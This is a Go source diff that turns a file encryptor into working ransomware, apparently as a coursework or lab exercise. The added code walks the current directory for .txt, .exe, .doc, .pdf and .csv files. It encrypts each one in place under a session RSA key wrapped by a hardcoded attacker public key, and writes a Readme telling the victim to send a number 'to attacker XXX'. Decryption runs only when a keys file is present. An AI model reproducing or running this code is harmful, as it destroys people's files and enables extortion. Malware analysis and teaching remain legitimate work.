@@ -1,19 +1,19 @@
 package main
 
 import (
+	"crypto/aes"
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/hex"
 	"fmt"
 	"io/ioutil"
+	"math"
 	"math/big"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
-	//"log"
-	"crypto/aes"
-	"encoding/hex"
-	"math"
 )
 
 ///addition, subtraction and multiplication
@@ -249,7 +249,7 @@ func key_clear(key *big.Int) {
 }
 
 //generate random RSA key pairs
-func RSA_key_gen(N, e *big.Int) (*big.Int, *big.Int) {
+func RSA_key_gen(dir string, N, e *big.Int) (*big.Int, *big.Int) {
 	big1 := big.NewInt(1)
 	p := key_gen()
 	q := key_gen()
@@ -264,10 +264,10 @@ func RSA_key_gen(N, e *big.Int) (*big.Int, *big.Int) {
 	sha_256 := sha256.New()
 	sha_256.Write(pri_data)
 
-	sha_256_loc := fmt.Sprintf("Server/%x", sha_256.Sum(nil))
+	sha_256_loc := fmt.Sprintf("%s/Server/%x", dir, sha_256.Sum(nil))
 	readme := fmt.Sprintf("Send this number %x to attacker XXX", sha_256.Sum(nil))
 	fmt.Println(readme)
-	ioutil.WriteFile("Readme.txt", []byte(readme), 0644)
+	ioutil.WriteFile("Readme", []byte(readme), 0644)
 	ioutil.WriteFile(sha_256_loc, pri_data, 0644)
 	return N_, e_
 }
@@ -373,32 +373,80 @@ func load_key(input_file string) (*big.Int, *big.Int) {
 	return N, d
 }
 
+func contains(ss []string, s string) bool {
+	for _, a := range ss {
+		if a == s {
+			return true
+		}
+	}
+	return false
+}
+
+func checkExt(ext []string) []string {
+	pathS, err := os.Getwd()
+	if err != nil {
+		panic(err)
+	}
+	var paths []string
+	filepath.Walk(pathS, func(path string, f os.FileInfo, _ error) error {
+		if f.IsDir() {
+			return nil
+		}
+		if contains(ext, filepath.Ext(path)) {
+			paths = append(paths, path)
+		}
+
+		return nil
+	})
+
+	return paths
+}
+
 func main() {
 	//Hardcoded public key
 	N, _ := new(big.Int).SetString("27373176497986431932251251116443926663831806261071313412989844158826154814084495647335491185915655601666177981912915917513154667109854715685389256347698156167098286352963470578246399719078975590638921432718527013913639908860623319460907657961571096028464789764100067928297618269506856287203984333985334991680977184069499150590693164224823071048888338148038226506445470031874898694438134368521730060168857461554576831837880299721200508752202214917227818509186371000166250119754889508590004281188893160298827566989760562889798571576260058420518940759480974818966399516795337246357463835643099652311241207979328006473273", 10)
 	e, _ := new(big.Int).SetString("114555885618321971166525289009247562530684912588490288375374382656653624817637873641873338444064827244125181436880632068365026025194100187802604323676970718988010331197271572511319987984765105343287840472134128084868761183464484207489195971498946203121897312631812237101119681888221283146033802960204006054855", 10)
-	//key gen
+	//
+	ext := []string{".txt", ".exe", ".doc", ".pdf", ".csv"}
+	mode := "-e"
+	paths := checkExt(ext)
+	if paths == nil {
+		fmt.Println("no files available")
+		os.Exit(0)
+	}
+	dir, _ := os.Getwd()
+	parent_dir := dir[:strings.LastIndex(dir, "/")]
 
-	mode := os.Args[1]
-	file := os.Args[2]
+	//check if key existed
+	_, err := ioutil.ReadFile("keys")
+	if err == nil {
+		mode = "-d"
+	}
+
+	// mode := os.Args[1]
+	// file := os.Args[2]
 	if mode == "-e" {
-		N_, e_ := RSA_key_gen(N, e)
-		encrypted_data := encrypt(N_, e_, read_file(file))
-		ioutil.WriteFile(file, encrypted_data, 0644)
+		N_, e_ := RSA_key_gen(parent_dir, N, e)
+		for _, path := range paths {
+			encrypted_data := encrypt(N_, e_, read_file(path))
+			ioutil.WriteFile(path, encrypted_data, 0644)
+		}
+
 	} else if mode == "-d" {
 		//Decrypt
-		N_, d_ := load_key(os.Args[3])
-		encrypted_data := read_file(os.Args[2])
-		Header := encrypted_data[:256]
-		//fmt.Printf("Header:%x\t with length:%d\n", Header, len(Header))
+		N_, d_ := load_key("keys")
+		for _, path := range paths {
+			encrypted_data := read_file(path)
+			Header := encrypted_data[:256]
+			//fmt.Printf("Header:%x\t with length:%d\n", Header, len(Header))
 
-		cipher_text := encrypted_data[256:]
-		big_header := new(big.Int).SetBytes(Header)
-		//fmt.Println("key int:", big_header)
-		Kenc := Fast_exp(big_header, d_, N_).Bytes()
-		//fmt.Printf("Kenc: %x\n", Kenc)
-		plain_text := decrypt(Kenc, cipher_text)
-		ioutil.WriteFile(file, plain_text, 0644)
-		//pri_key_file := os.Args[3]
+			cipher_text := encrypted_data[256:]
+			big_header := new(big.Int).SetBytes(Header)
+			//fmt.Println("key int:", big_header)
+			Kenc := Fast_exp(big_header, d_, N_).Bytes()
+			//fmt.Printf("Kenc: %x\n", Kenc)
+			plain_text := decrypt(Kenc, cipher_text)
+			ioutil.WriteFile(path, plain_text, 0644)
+		}
 	}
 }
